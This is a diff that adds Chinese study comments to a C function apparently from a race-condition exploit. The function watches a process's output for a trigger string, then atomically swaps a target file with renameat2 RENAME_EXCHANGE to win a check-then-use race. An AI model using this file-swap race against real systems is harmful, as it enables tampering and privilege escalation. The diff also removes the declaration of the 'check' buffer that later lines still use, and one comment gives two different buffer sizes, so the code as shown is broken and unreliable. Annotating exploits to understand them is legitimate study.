@@ -251,13 +251,13 @@ static int run_and_race(void)
         //标准输出（终端屏幕），把 byte 这个字符输出到终端
 
         /* 向环形缓冲区添加字节 */
-        ringbuf[ringpos % sizeof(ringbuf)] = byte;
-        ringpos++;
+        ringbuf[ringpos % sizeof(ringbuf)] = byte;    //ringbuf 大小 = 4,sizeof(ringbuf)：缓冲区大小（这里是 4096）,%（取模）让索引始终落在 0 ~ 4095 之间
+        ringpos++;    //ringpos：当前写入的“总位置计数”（一直递增）
+        //从环形缓冲区里取“最近 tlen 个字节” ,ringbuf = 一个循环的录音带 ,ringpos = 当前录音位置, 录满之后：会覆盖最旧的声音
 
         /* 一旦我们有足够的字节，检查触发器 */
-        if (!swapped && ringpos >= tlen) {
-            char check[512];
-            for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)
+        if (!swapped && ringpos >= tlen) { //!swapped：还没执行过交换（只允许一次）,ringpos >= tlen：缓冲区里至少有 tlen 个字节，才有可能匹配完整的 TRIGGER
+            for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)  //从环形缓冲区里取“最近 tlen 个字节”
                 check[i] = ringbuf[(ringpos-tlen + i) % sizeof(ringbuf)];
             check[tlen] = '\0';
 
@@ -265,11 +265,14 @@ static int run_and_race(void)
                 printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
 
                 /* 触发命中：快照限制暂停后，步骤1-安全交换 */
-                #ifndef RENAME_EXCHANGE
-                #define RENAME_EXCHANGE (1 << 1)
+                //C预处理宏(macro)
+                #ifndef RENAME_EXCHANGE   //if not defined ,如果 RENAME_EXCHANGE 没有被定义过
+                #define RENAME_EXCHANGE (1 << 1)  //“开关位”（flag），强调：这是“第2个标志位”
                 #endif
                 if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                             AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
+                 //SYS_renameat2 系统调用号,AT_FDCWD表示“当前工作目录"，EXCHANGE_DST目标路径(被替换的),EXCHANGE_SRC源路径(用来替换的),RENAME_EXCHANGE交换而不是覆盖
+                 //瞬间完成，没有中间状态，这对 race 极其关键
                     /* 原子交换成功 */
                 } else {
                     /* 如果renameat2不可用（非原子），则回退) */
